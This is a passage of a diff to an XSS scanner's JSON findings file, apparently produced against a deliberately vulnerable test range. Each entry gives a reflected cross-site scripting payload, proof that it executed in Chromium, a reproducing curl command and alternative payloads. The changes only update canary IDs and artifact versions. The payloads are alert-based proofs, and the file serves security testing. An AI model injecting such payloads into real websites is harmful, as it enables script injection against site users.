+      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/tagname?q=sv1fcc8388f%3E%3Csvg%2Fonload%3Dalert%28%27sv1fcc8388f%27%29%3E'",
       "data": {},
       "alternatives": [
-        "sv1bd37afa2><img src=x onerror=alert('sv1bd37afa2')>",
-        "sv1bd37afa2 onmouseover=\"alert('sv1bd37afa2')\" x=",
-        "sv1bd37afa2\"><svg/onload=alert('sv1bd37afa2')>",
-        "sv1bd37afa2'><svg/onload=alert('sv1bd37afa2')>",
-        "sv1bd37afa2</title><svg/onload=alert('sv1bd37afa2')>"
+        "sv1fcc8388f><img src=x onerror=alert('sv1fcc8388f')>",
+        "sv1fcc8388f onmouseover=\"alert('sv1fcc8388f')\" x=",
+        "sv1fcc8388f\"><svg/onload=alert('sv1fcc8388f')>",
+        "sv1fcc8388f'><svg/onload=alert('sv1fcc8388f')>",
+        "sv1fcc8388f</title><svg/onload=alert('sv1fcc8388f')>"
       ]
     },
     {
@@ -829,20 +829,20 @@
       "url": "https://public-firing-range.appspot.com/reflected/parameter/textarea",
       "method": "GET",
       "param": "q",
-      "payload": "</textarea><svg/onload=alert('sv1139f5c70')>",
+      "payload": "</textarea><svg/onload=alert('sv1f9a95430')>",
       "confidence": "CONFIRMED",
-      "evidence": "executed in chromium: alert:sv1139f5c70",
+      "evidence": "executed in chromium: alert:sv1f9a95430",
       "technique": "reflected/raw",
       "detail": "inside <textarea> raw text | proof: alert fired",
-      "artifact": "fr-artifacts-1.2.0/xss-19.png",
-      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/textarea?q=%3C%2Ftextarea%3E%3Csvg%2Fonload%3Dalert%28%27sv1139f5c70%27%29%3E'",
+      "artifact": "fr-artifacts-1.2.1/xss-19.png",
+      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/textarea?q=%3C%2Ftextarea%3E%3Csvg%2Fonload%3Dalert%28%27sv1f9a95430%27%29%3E'",
       "data": {},
       "alternatives": [
-        "</textarea><img src=x onerror=alert('sv1139f5c70')>",
-        "</textarea><script>alert('sv1139f5c70')</script>",
-        "sv1139f5c70\"><svg/onload=alert('sv1139f5c70')>",
-        "sv1139f5c70'><svg/onload=alert('sv1139f5c70')>",
-        "sv1139f5c70</title><svg/onload=alert('sv1139f5c70')>"
+        "</textarea><img src=x onerror=alert('sv1f9a95430')>",
+        "</textarea><script>alert('sv1f9a95430')</script>",
+        "sv1f9a95430\"><svg/onload=alert('sv1f9a95430')>",
+        "sv1f9a95430'><svg/onload=alert('sv1f9a95430')>",
+        "sv1f9a95430</title><svg/onload=alert('sv1f9a95430')>"
       ]
     },
     {
@@ -851,20 +851,20 @@
       "url": "https://public-firing-range.appspot.com/reflected/parameter/textarea_attribute_value",
       "method": "GET",
       "param": "q",
-      "payload": "sv1a9ad7466'></textarea><svg/onload=alert(\"sv1a9ad7466\")>",
+      "payload": "sv1d786ac94'></textarea><svg/onload=alert(\"sv1d786ac94\")>",
       "confidence": "CONFIRMED",
-      "evidence": "executed in chromium: alert:sv1a9ad7466",
+      "evidence": "executed in chromium: alert:sv1d786ac94",
       "technique": "reflected/attr",
       "detail": "inside <textarea> attribute attribute (single quoted) | proof: alert fired",
-      "artifact": "fr-artifacts-1.2.0/xss-17.png",
-      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/textarea_attribute_value?q=sv1a9ad7466%27%3E%3C%2Ftextarea%3E%3Csvg%2Fonload%3Dalert%28%22sv1a9ad7466%22%29%3E'",
+      "artifact": "fr-artifacts-1.2.1/xss-17.png",
+      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/textarea_attribute_value?q=sv1d786ac94%27%3E%3C%2Ftextarea%3E%3Csvg%2Fonload%3Dalert%28%22sv1d786ac94%22%29%3E'",
       "data": {},
       "alternatives": [
-        "sv1a9ad7466'></textarea><img src=x onerror=alert(\"sv1a9ad7466\")>",
-        "sv1a9ad7466\"><svg/onload=alert('sv1a9ad7466')>",
-        "sv1a9ad7466'><svg/onload=alert('sv1a9ad7466')>",
-        "sv1a9ad7466</title><svg/onload=alert('sv1a9ad7466')>",
-        "sv1a9ad7466<img src=x onerror=alert('sv1a9ad7466')>"
+        "sv1d786ac94'></textarea><img src=x onerror=alert(\"sv1d786ac94\")>",
+        "sv1d786ac94\"><svg/onload=alert('sv1d786ac94')>",
+        "sv1d786ac94'><svg/onload=alert('sv1d786ac94')>",
+        "sv1d786ac94</title><svg/onload=alert('sv1d786ac94')>",
+        "sv1d786ac94<img src=x onerror=alert('sv1d786ac94')>"
       ]
     },
     {
@@ -873,20 +873,20 @@
       "url": "https://public-firing-range.appspot.com/reflected/parameter/title",
       "method": "GET",
       "param": "q",
-      "payload": "</title><svg/onload=alert('sv1a86a43cc')>",
+      "payload": "</title><svg/onload=alert('sv1b29e2de2')>",
       "confidence": "CONFIRMED",
-      "evidence": "executed in chromium: alert:sv1a86a43cc",
+      "evidence": "executed in chromium: alert:sv1b29e2de2",
       "technique": "reflected/raw",
       "detail": "inside <title> raw text | proof: alert fired",
-      "artifact": "fr-artifacts-1.2.0/xss-04.png",
-      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/title?q=%3C%2Ftitle%3E%3Csvg%2Fonload%3Dalert%28%27sv1a86a43cc%27%29%3E'",
+      "artifact": "fr-artifacts-1.2.1/xss-03.png",
+      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/title?q=%3C%2Ftitle%3E%3Csvg%2Fonload%3Dalert%28%27sv1b29e2de2%27%29%3E'",
       "data": {},
       "alternatives": [
-        "</title><img src=x onerror=alert('sv1a86a43cc')>",
-        "</title><script>alert('sv1a86a43cc')</script>",
-        "sv1a86a43cc\"><svg/onload=alert('sv1a86a43cc')>",
-        "sv1a86a43cc'><svg/onload=alert('sv1a86a43cc')>",
-        "sv1a86a43cc</title><svg/onload=alert('sv1a86a43cc')>"
+        "</title><img src=x onerror=alert('sv1b29e2de2')>",
+        "</title><script>alert('sv1b29e2de2')</script>",
+        "sv1b29e2de2\"><svg/onload=alert('sv1b29e2de2')>",
+        "sv1b29e2de2'><svg/onload=alert('sv1b29e2de2')>",
+        "sv1b29e2de2</title><svg/onload=alert('sv1b29e2de2')>"
       ]
     },
     {
@@ -895,13 +895,13 @@
       "url": "https://public-firing-range.appspot.com/reflected/url/href",
       "method": "GET",
       "param": "q",
-      "payload": "javascript:alert('sv1e703af58')",
+      "payload": "javascript:alert('sv1b7aebb6a')",
       "confidence": "CONFIRMED",
-      "evidence": "executed in chromium: alert:sv1e703af58",
+      "evidence": "executed in chromium: alert:sv1b7aebb6a",
       "technique": "reflected/attr",
       "detail": "inside <a> attribute href (double quoted) | proof: alert fired",
-      "artifact": "fr-artifacts-1.2.0/xss-34.png",
-      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/url/href?q=javascript%3Aalert%28%27sv1e703af58%27%29'",
+      "artifact": "fr-artifacts-1.2.1/xss-34.png",
+      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/url/href?q=javascript%3Aalert%28%27sv1b7aebb6a%27%29'",
       "data": {}
     },
     {
@@ -910,13 +910,13 @@
       "url": "https://public-firing-range.appspot.com/reflected/url/css_import",
       "method": "GET",
       "param": "q",
-      "payload": "javascript:alert('sv10fcd2290')",
+      "payload": "javascript:alert('sv11f663c90')",
       "confidence": "MEDIUM",
-      "evidence": "<html> <head> <link rel=\"stylesheet\" href=\"javascript:alert('sv10fcd2290')\" /> </head> <body> </body> </html>",
+      "evidence": "<html> <head> <link rel=\"stylesheet\" href=\"javascript:alert('sv11f663c90')\" /> </head> <body> </body> </html>",
       "technique": "reflected/attr",
       "detail": "inside <link> attribute href (double quoted) | chromium did not execute the payload",
       "artifact": "",
-      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/url/css_import?q=javascript%3Aalert%28%27sv10fcd2290%27%29'",
+      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/url/css_import?q=javascript%3Aalert%28%27sv11f663c90%27%29'",
       "data": {}
     },
     {
@@ -925,13 +925,13 @@
       "url": "https://public-firing-range.appspot.com/reflected/url/object_data",
       "method": "GET",
       "param": "q",
-      "payload": "javascript:alert('sv1af086236')",
+      "payload": "javascript:alert('sv1d913fc6c')",
       "confidence": "MEDIUM",
-      "evidence": "<html> <body> <object type=\"application/x-shockwave-flash\" data=\"javascript:alert('sv1af086236')\" width=\"200\" height=\"200\"> </object> </body> </html>",
+      "evidence": "<html> <body> <object type=\"application/x-shockwave-flash\" data=\"javascript:alert('sv1d913fc6c')\" width=\"200\" height=\"200\"> </object> </body> </html>",
       "technique": "reflected/attr",
       "detail": "inside <object> attribute data (double quoted) | chromium did not execute the payload",
       "artifact": "",
-      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/url/object_data?q=javascript%3Aalert%28%27sv1af086236%27%29'",
+      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/url/object_data?q=javascript%3Aalert%28%27sv1d913fc6c%27%29'",
       "data": {}
     }
   ]
